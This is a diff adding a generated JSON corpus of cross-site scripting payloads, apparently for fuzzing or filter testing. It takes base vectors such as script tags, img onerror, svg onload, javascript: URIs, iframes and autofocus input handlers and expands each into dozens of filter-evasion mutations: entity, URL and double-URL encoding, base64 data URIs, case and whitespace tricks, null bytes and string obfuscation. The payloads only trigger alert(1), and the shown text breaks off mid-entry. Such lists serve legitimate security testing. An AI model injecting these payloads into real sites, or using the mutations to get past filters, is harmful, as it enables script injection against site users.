@@ -1,0 +1,1246 @@
+{
+  "version": "1.0",
+  "generated": "2025-12-15T22:12:54.755Z",
+  "basePayloads": [
+    {
+      "base": "<script>alert(1)</script>",
+      "category": "basic",
+      "mutations": [
+        {
+          "payload": "<script>alert(1)</script>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;script&#62;alert(1)&#60;/script&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Cscript%3Ealert(1)%3C/script%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<SCRIPT>ALERT(1)</SCRIPT>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Script>Alert(1)</Script>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<ScRiPt>aLeRt(1)</sCrIpT>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>alert(1)\u0000</script>",
+          "strategy": "null-byte-before-close",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script\u0000>alert(1)</script>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><script>alert(1)</script>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>/**/alert(1)</script>",
+          "strategy": "comment-js-after-open",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>//\nalert(1)</script>",
+          "strategy": "comment-js-line",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>'al'+'ert'(1)</script>",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>`alert`(1)</script>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 23
+    },
+    {
+      "base": "<img src=x onerror=alert(1)>",
+      "category": "event-handler",
+      "mutations": [
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#105;&#109;&#103;&#32;&#115;&#114;&#99;&#61;&#120;&#32;&#111;&#110;&#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;img src=x onerror=alert(1)&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x69;&#x6d;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x78;&#x20;&#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;img src=x onerror=alert(1)&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Cimg src=x onerror=alert(1)%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003cimg src=x onerror=alert(1)\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3cimg src=x onerror=alert(1)\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<IMG SRC=X ONERROR=ALERT(1)>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Img Src=X Onerror=Alert(1)>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<ImG SrC=X OnErRoR=AlErT(1)>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img\tsrc=x\tonerror=alert(1)>",
+          "strategy": "whitespace-tab",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img\nsrc=x\nonerror=alert(1)>",
+          "strategy": "whitespace-newline",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img  src=x  onerror=alert(1)>",
+          "strategy": "whitespace-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img\fsrc=x\fonerror=alert(1)>",
+          "strategy": "whitespace-formfeed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img\u0000 src=x onerror=alert(1)>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><img src=x onerror=alert(1)>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img src=javascript:x onerror=alert(1)>",
+          "strategy": "protocol-javascript-inject",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img src=x onerror='al'+'ert'(1)>",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img src=x onerror=`alert`(1)>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        },
+        {
+          "payload": "<img src=x onerror=alert(1)/>",
+          "strategy": "obfuscation-add-self-close",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 26
+    },
+    {
+      "base": "<svg/onload=alert(1)>",
+      "category": "svg",
+      "mutations": [
+        {
+          "payload": "<svg/onload=alert(1)>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#115;&#118;&#103;&#47;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;svg/onload=alert(1)&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x73;&#x76;&#x67;&#x2f;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;svg/onload=alert(1)&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Csvg%2Fonload%3Dalert(1)%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Csvg/onload=alert(1)%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Csvg%252Fonload%253Dalert(1)%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003csvg/onload=alert(1)\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3csvg/onload=alert(1)\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<SVG/ONLOAD=ALERT(1)>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Svg/Onload=Alert(1)>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<SvG/OnLoAd=aLeRt(1)>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<svg\u0000/onload=alert(1)>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><svg/onload=alert(1)>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<svg/onload='al'+'ert'(1)>",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<svg/onload=`alert`(1)>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<svg/onload=\\x61\\x6c\\x65\\x72\\x74(1)>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 20
+    },
+    {
+      "base": "javascript:alert(1)",
+      "category": "protocol-handler",
+      "mutations": [
+        {
+          "payload": "javascript:alert(1)",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "javascript%3Aalert(1)",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "javascript%253Aalert(1)",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "data:text/html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "amF2YXNjcmlwdDphbGVydCgxKQ==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "JAVASCRIPT:ALERT(1)",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "Javascript:Alert(1)",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "jAvAsCrIpT:AlErT(1)",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!-->javascript:alert(1)",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "java script:alert(1)",
+          "strategy": "protocol-space",
+          "encoding": "none"
+        },
+        {
+          "payload": "vbscript:alert(1)",
+          "strategy": "protocol-vbscript",
+          "encoding": "none"
+        },
+        {
+          "payload": "data:text/html,alert(1)",
+          "strategy": "protocol-data",
+          "encoding": "none"
+        },
+        {
+          "payload": "javascript:'al'+'ert'(1)",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "javascript:`alert`(1)",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "javascript:\\x61\\x6c\\x65\\x72\\x74(1)",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 17
+    },
+    {
+      "base": "<iframe src=\"javascript:alert(1)\">",
+      "category": "iframe",
+      "mutations": [
+        {
+          "payload": "<iframe src=\"javascript:alert(1)\">",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#105;&#102;&#114;&#97;&#109;&#101;&#32;&#115;&#114;&#99;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#34;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;iframe src=&#34;javascript:alert(1)&#34;&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x69;&#x66;&#x72;&#x61;&#x6d;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;iframe src=&#x22;javascript:alert(1)&#x22;&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Ciframe src=%22javascript:alert(1)%22%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Ciframe%2520src%253D%2522javascript%253Aalert(1)%2522%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003ciframe src=\\u0022javascript:alert(1)\\u0022\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3ciframe src=\\x22javascript:alert(1)\\x22\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPg==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiPg==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<IFRAME SRC=\"JAVASCRIPT:ALERT(1)\">",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Iframe Src=\"Javascript:Alert(1)\">",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<IfRaMe sRc=\"JaVaScRiPt:aLeRt(1)\">",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src='javascript:alert(1)'>",
+          "strategy": "quote-single",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=`javascript:alert(1)`>",
+          "strategy": "quote-backtick",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=javascript:alert(1)>",
+          "strategy": "quote-none",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe\tsrc=\"javascript:alert(1)\">",
+          "strategy": "whitespace-tab",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe\nsrc=\"javascript:alert(1)\">",
+          "strategy": "whitespace-newline",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe  src=\"javascript:alert(1)\">",
+          "strategy": "whitespace-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe\fsrc=\"javascript:alert(1)\">",
+          "strategy": "whitespace-formfeed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe\u0000 src=\"javascript:alert(1)\">",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><iframe src=\"javascript:alert(1)\">",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"java script:alert(1)\">",
+          "strategy": "protocol-space",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"vbscript:alert(1)\">",
+          "strategy": "protocol-vbscript",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"data:text/html,alert(1)\">",
+          "strategy": "protocol-data",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=javascript:\"javascript:alert(1)\">",
+          "strategy": "protocol-javascript-inject",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"javascript:'al'+'ert'(1)\">",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"javascript:`alert`(1)\">",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<iframe src=\"javascript:\\x61\\x6c\\x65\\x72\\x74(1)\">",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 31
+    },
+    {
+      "base": "<input onfocus=alert(1) autofocus>",
+      "category": "input-event",
+      "mutations": [
+        {
+          "payload": "<input onfocus=alert(1) autofocus>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#105;&#110;&#112;&#117;&#116;&#32;&#111;&#110;&#102;&#111;&#99;&#117;&#115;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#32;&#97;&#117;&#116;&#111;&#102;&#111;&#99;&#117;&#115;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;input onfocus=alert(1) autofocus&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x6f;&#x6e;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x20;&#x61;&#x75;&#x74;&#x6f;&#x66;&#x6f;&#x63;&#x75;&#x73;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;input onfocus=alert(1) autofocus&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Cinput onfocus=alert(1) autofocus%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Cinput%2520onfocus%253Dalert(1)%2520autofocus%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003cinput onfocus=alert(1) autofocus\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3cinput onfocus=alert(1) autofocus\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PGlucHV0IG9uZm9jdXM9YWxlcnQoMSkgYXV0b2ZvY3VzPg==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PGlucHV0IG9uZm9jdXM9YWxlcnQoMSkgYXV0b2ZvY3VzPg==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<INPUT ONFOCUS=ALERT(1) AUTOFOCUS>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Input Onfocus=Alert(1) Autofocus>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<InPuT OnFoCuS=AlErT(1) aUtOfOcUs>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input\tonfocus=alert(1)\tautofocus>",
+          "strategy": "whitespace-tab",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input\nonfocus=alert(1)\nautofocus>",
+          "strategy": "whitespace-newline",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input  onfocus=alert(1)  autofocus>",
+          "strategy": "whitespace-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input\fonfocus=alert(1)\fautofocus>",
+          "strategy": "whitespace-formfeed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input\u0000 onfocus=alert(1) autofocus>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><input onfocus=alert(1) autofocus>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input onfocus='al'+'ert'(1) autofocus>",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input onfocus=`alert`(1) autofocus>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input onfocus=\\x61\\x6c\\x65\\x72\\x74(1) autofocus>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        },
+        {
+          "payload": "<input onfocus=alert(1) autofocus/>",
+          "strategy": "obfuscation-add-self-close",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 25
+    },
+    {
+      "base": "<body onload=alert(1)>",
+      "category": "body-event",
+      "mutations": [
+        {
+          "payload": "<body onload=alert(1)>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#98;&#111;&#100;&#121;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;body onload=alert(1)&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x20;&#x6f;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;body onload=alert(1)&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Cbody%20onload%3Dalert(1)%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Cbody onload=alert(1)%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Cbody%2520onload%253Dalert(1)%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003cbody onload=alert(1)\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3cbody onload=alert(1)\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<BODY ONLOAD=ALERT(1)>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Body Onload=Alert(1)>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<BoDy oNlOaD=AlErT(1)>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body\tonload=alert(1)>",
+          "strategy": "whitespace-tab",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body\nonload=alert(1)>",
+          "strategy": "whitespace-newline",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body  onload=alert(1)>",
+          "strategy": "whitespace-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body\fonload=alert(1)>",
+          "strategy": "whitespace-formfeed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body\u0000 onload=alert(1)>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><body onload=alert(1)>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body onload='al'+'ert'(1)>",
+          "strategy": "obfuscation-concat",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body onload=`alert`(1)>",
+          "strategy": "obfuscation-template",
+          "encoding": "none"
+        },
+        {
+          "payload": "<body onload=\\x61\\x6c\\x65\\x72\\x74(1)>",
+          "strategy": "obfuscation-hex-string",
+          "encoding": "none"
+        }
+      ],
+      "mutationCount": 24
+    },
+    {
+      "base": "<details open ontoggle=alert(1)>",
+      "category": "html5",
+      "mutations": [
+        {
+          "payload": "<details open ontoggle=alert(1)>",
+          "strategy": "original",
+          "encoding": "none"
+        },
+        {
+          "payload": "&#60;&#100;&#101;&#116;&#97;&#105;&#108;&#115;&#32;&#111;&#112;&#101;&#110;&#32;&#111;&#110;&#116;&#111;&#103;&#103;&#108;&#101;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#62;",
+          "strategy": "html-entity-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#60;details open ontoggle=alert(1)&#62;",
+          "strategy": "html-entity-partial-decimal",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6c;&#x73;&#x20;&#x6f;&#x70;&#x65;&#x6e;&#x20;&#x6f;&#x6e;&#x74;&#x6f;&#x67;&#x67;&#x6c;&#x65;&#x3d;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3e;",
+          "strategy": "html-entity-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "&#x3c;details open ontoggle=alert(1)&#x3e;",
+          "strategy": "html-entity-partial-hex",
+          "encoding": "html"
+        },
+        {
+          "payload": "%3Cdetails%20open%20ontoggle%3Dalert(1)%3E",
+          "strategy": "url-encoding-single",
+          "encoding": "url"
+        },
+        {
+          "payload": "%3Cdetails open ontoggle=alert(1)%3E",
+          "strategy": "url-encoding-partial",
+          "encoding": "url"
+        },
+        {
+          "payload": "%253Cdetails%2520open%2520ontoggle%253Dalert(1)%253E",
+          "strategy": "url-encoding-double",
+          "encoding": "url"
+        },
+        {
+          "payload": "\\u003cdetails open ontoggle=alert(1)\\u003e",
+          "strategy": "unicode-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "\\x3cdetails open ontoggle=alert(1)\\x3e",
+          "strategy": "hex-escape",
+          "encoding": "unicode"
+        },
+        {
+          "payload": "data:text/html;base64,PGRldGFpbHMgb3BlbiBvbnRvZ2dsZT1hbGVydCgxKT4=",
+          "strategy": "base64-data-uri",
+          "encoding": "base64"
+        },
+        {
+          "payload": "PGRldGFpbHMgb3BlbiBvbnRvZ2dsZT1hbGVydCgxKT4=",
+          "strategy": "base64",
+          "encoding": "base64"
+        },
+        {
+          "payload": "<DETAILS OPEN ONTOGGLE=ALERT(1)>",
+          "strategy": "case-uppercase",
+          "encoding": "none"
+        },
+        {
+          "payload": "<Details Open Ontoggle=Alert(1)>",
+          "strategy": "case-mixed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<DeTaIlS OpEn oNtOgGlE=AlErT(1)>",
+          "strategy": "case-alternating",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details\topen\tontoggle=alert(1)>",
+          "strategy": "whitespace-tab",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details\nopen\nontoggle=alert(1)>",
+          "strategy": "whitespace-newline",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details  open  ontoggle=alert(1)>",
+          "strategy": "whitespace-double",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details\fopen\fontoggle=alert(1)>",
+          "strategy": "whitespace-formfeed",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details\u0000 open ontoggle=alert(1)>",
+          "strategy": "null-byte-after-tag",
+          "encoding": "none"
+        },
+        {
+          "payload": "<!--><details open ontoggle=alert(1)>",
+          "strategy": "comment-html-before",
+          "encoding": "none"
+        },
+        {
+          "payload": "<details open ontoggle='al'+'ert'(1)>",
+          "strategy": "obfuscation-concat",
